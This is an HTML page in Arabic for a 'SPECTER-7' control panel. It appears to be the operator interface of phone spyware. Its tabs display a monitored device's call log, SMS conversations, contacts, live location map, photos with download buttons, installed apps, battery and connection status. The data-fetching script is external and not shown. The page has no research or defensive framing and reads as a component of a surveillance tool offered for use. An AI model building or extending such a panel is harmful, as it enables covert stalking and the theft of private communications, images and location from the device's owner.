<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPECTER-7 Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a1a; color: #e0e0e0; min-height: 100vh; direction: rtl; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #16213e; padding: 15px 20px; border-radius: 10px; flex-wrap: wrap; gap: 10px; }
        h1 { color: #0f3460; font-size: 24px; }
        .device-selector { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .device-selector select { background: #0f3460; color: white; padding: 10px 15px; border: none; border-radius: 5px; font-size: 14px; min-width: 200px; cursor: pointer; }
        .logout-btn { background: #2a1a1a; color: #ff6b6b; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .delete-btn { background: #3a0a0a; color: #ff4444; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .status-bar { display: flex; gap: 20px; margin-bottom: 20px; background: #16213e; padding: 15px 20px; border-radius: 10px; flex-wrap: wrap; }
        .status-item { display: flex; gap: 8px; align-items: center; }
        .label { color: #888; font-size: 14px; }
        .value { color: #ff6b6b; font-weight: bold; font-size: 14px; }
        .value.online { color: #4ade80; }
        .value.offline { color: #ff6b6b; }
        .tabs { display: flex; gap: 5px; margin-bottom: 0; flex-wrap: wrap; }
        .tab { background: #16213e; color: #e0e0e0; border: none; padding: 12px 20px; cursor: pointer; border-radius: 8px 8px 0 0; font-size: 14px; transition: background 0.3s; }
        .tab:hover { background: #1a1a4e; }
        .tab.active { background: #0f3460; color: white; }
        .count { color: #ff6b6b; font-size: 12px; margin-right: 4px; }
        .tab-content { background: #16213e; padding: 20px; border-radius: 0 0 10px 10px; min-height: 400px; }
        .tab-pane { display: none; }
        .tab-pane.active { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        h3 { margin-bottom: 15px; color: #2980b9; font-size: 18px; border-bottom: 2px solid #0f3460; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: right; border-bottom: 1px solid #2a2a4a; font-size: 13px; }
        th { background: #0f3460; color: white; font-weight: 600; }
        tr:hover { background: #1a1a4e; }
        .call-type { padding: 3px 8px; border-radius: 3px; font-size: 12px; }
        .type-1 { background: #4ade8022; color: #4ade80; }
        .type-2 { background: #2980b922; color: #2980b9; }
        .type-3 { background: #ff444422; color: #ff4444; }
        .conversation-item { display: flex; align-items: center; gap: 15px; padding: 15px; background: #0f3460; border-radius: 8px; margin-bottom: 10px; cursor: pointer; transition: background 0.3s; }
        .conversation-item:hover { background: #1a4a7a; }
        .conversation-avatar { font-size: 30px; }
        .conversation-info { flex: 1; }
        .conversation-name { font-weight: bold; color: white; }
        .conversation-preview { color: #aaa; font-size: 13px; margin-top: 5px; }
        .conversation-time { color: #888; font-size: 12px; }
        .conversation-count { background: #2980b9; color: white; padding: 5px 10px; border-radius: 15px; font-size: 12px; }
        .back-btn { background: #0f3460; color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; margin-bottom: 15px; }
        .messages-list { max-height: 500px; overflow-y: auto; padding: 10px; }
        .message { display: flex; margin-bottom: 10px; }
        .message.incoming { justify-content: flex-start; }
        .message.outgoing { justify-content: flex-end; }
        .message-bubble { max-width: 70%; padding: 10px 15px; border-radius: 15px; }
        .incoming .message-bubble { background: #0f3460; }
        .outgoing .message-bubble { background: #2980b9; }
        .message-text { color: white; }
        .message-time { color: #aaa; font-size: 11px; margin-top: 5px; }
        .action-btn { background: #0f3460; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin: 0 2px; }
        .action-btn:hover { background: #1a4a7a; }
        .images-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .image-card { background: #0f3460; padding: 10px; border-radius: 8px; text-align: center; }
        .thumb { width: 100%; height: 180px; object-fit: cover; border-radius: 5px; cursor: pointer; transition: transform 0.3s; }
        .thumb:hover { transform: scale(1.03); }
        .image-name { color: white; font-size: 12px; margin-top: 8px; word-break: break-all; }
        .image-buttons { display: flex; gap: 5px; margin-top: 8px; }
        .view-btn, .download-btn { flex: 1; padding: 8px; border: none; border-radius: 5px; cursor: pointer; font-size: 12px; color: white; }
        .view-btn { background: #2980b9; }
        .download-btn { background: #27ae60; }
        .view-btn:hover { background: #3498db; }
        .download-btn:hover { background: #2ecc71; }
        .device-info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .info-card { background: #0f3460; padding: 15px; border-radius: 8px; }
        .info-card span { color: #aaa; display: block; font-size: 12px; margin-bottom: 5px; }
        .info-card strong { color: white; font-size: 14px; }
        .call-detail-item { display: flex; gap: 15px; align-items: center; padding: 15px; background: #0f3460; border-radius: 8px; margin-bottom: 10px; color: white; }
        .contact-detail-card { background: #0f3460; padding: 20px; border-radius: 10px; text-align: center; }
        .contact-avatar { font-size: 50px; margin-bottom: 10px; }
        .contact-detail-card h4 { color: white; font-size: 20px; margin-bottom: 20px; }
        .contact-numbers { display: flex; flex-direction: column; gap: 10px; }
        .contact-number-item { display: flex; justify-content: space-between; align-items: center; background: #16213e; padding: 10px 15px; border-radius: 5px; color: white; }
        #locationDetails { background: #0f3460; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
        #locationDetails p { color: white; margin-bottom: 5px; }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            header { flex-direction: column; align-items: stretch; }
            .device-selector { flex-direction: column; }
            .device-selector select { width: 100%; }
            .status-bar { flex-direction: column; gap: 8px; }
            .tab { font-size: 12px; padding: 8px 12px; }
            .images-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
            .thumb { height: 120px; }
            .message-bubble { max-width: 90%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>SPECTER-7</h1>
            <div class="device-selector">
                <select id="deviceSelect" onchange="selectDevice(this.value)">
                    <option value="">اختر الجهاز...</option>
                </select>
                <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف</button>
                <button onclick="logout()" class="logout-btn">خروج</button>
            </div>
        </header>
        
        <div class="status-bar">
            <div class="status-item">
                <span class="label">الحالة:</span>
                <span id="networkStatus" class="value">غير متصل</span>
            </div>
            <div class="status-item">
                <span class="label">الموقع:</span>
                <span id="locationStatus" class="value">غير متاح</span>
            </div>
            <div class="status-item">
                <span class="label">البطارية:</span>
                <span id="batteryStatus" class="value">غير معروف</span>
            </div>
            <div class="status-item">
                <span class="label">آخر اتصال:</span>
                <span id="lastSeen" class="value">—</span>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
            <button class="tab" onclick="switchTab('sms')">💬 الرسائل <span id="smsCount" class="count"></span></button>
            <button class="tab" onclick="switchTab('contacts')">👥 جهات الاتصال <span id="contactsCount" class="count"></span></button>
            <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
            <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
            <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
            <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
        </div>
        
        <div class="tab-content">
            <div id="callsTab" class="tab-pane active">
                <h3>📞 المكالمات</h3>
                <div id="callsListView"></div>
                <div id="callDetailView" style="display:none;">
                    <button onclick="backToCallsList()" class="back-btn">⬅️ رجوع</button>
                    <h4 id="callDetailTitle"></h4>
                    <div id="callDetailsList"></div>
                </div>
            </div>
            
            <div id="smsTab" class="tab-pane">
                <h3>💬 المحادثات</h3>
                <div id="conversationsList"></div>
                <div id="chatView" style="display:none;">
                    <button onclick="backToConversations()" class="back-btn">⬅️ رجوع</button>
                    <h4 id="chatTitle"></h4>
                    <div id="messagesList" class="messages-list"></div>
                </div>
            </div>
            
            <div id="contactsTab" class="tab-pane">
                <h3>👥 جهات الاتصال</h3>
                <div id="contactsListView"></div>
                <div id="contactDetailView" style="display:none;">
                    <button onclick="backToContactsList()" class="back-btn">⬅️ رجوع</button>
                    <div id="contactDetails"></div>
                </div>
            </div>
            
            <div id="locationTab" class="tab-pane">
                <h3>📍 الموقع</h3>
                <div id="locationDetails"></div>
                <div id="map" style="height:400px;"></div>
            </div>
            
            <div id="imagesTab" class="tab-pane">
                <h3>🖼️ الصور</h3>
                <div id="imagesGrid" class="images-grid"></div>
            </div>
            
            <div id="appsTab" class="tab-pane">
                <h3>📱 التطبيقات</h3>
                <table id="appsTable">
                    <thead>
                        <tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr>
                    </thead>
                    <tbody></tbody>
                </table>
            </div>
            
            <div id="deviceTab" class="tab-pane">
                <h3>📊 معلومات الجهاز</h3>
                <div id="deviceInfo"></div>
            </div>
        </div>
    </div>
    
    <script src="script.js"></script>
    
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        playSound();
    });

    function playSound() {
        try {
            const audio = new Audio('v.wav');
            audio.volume = 1.0;
            audio.loop = false;
            audio.play();
        } catch (e) {
            console.log('Sound error:', e);
        }
    }
    </script>
</body>
                    </html>
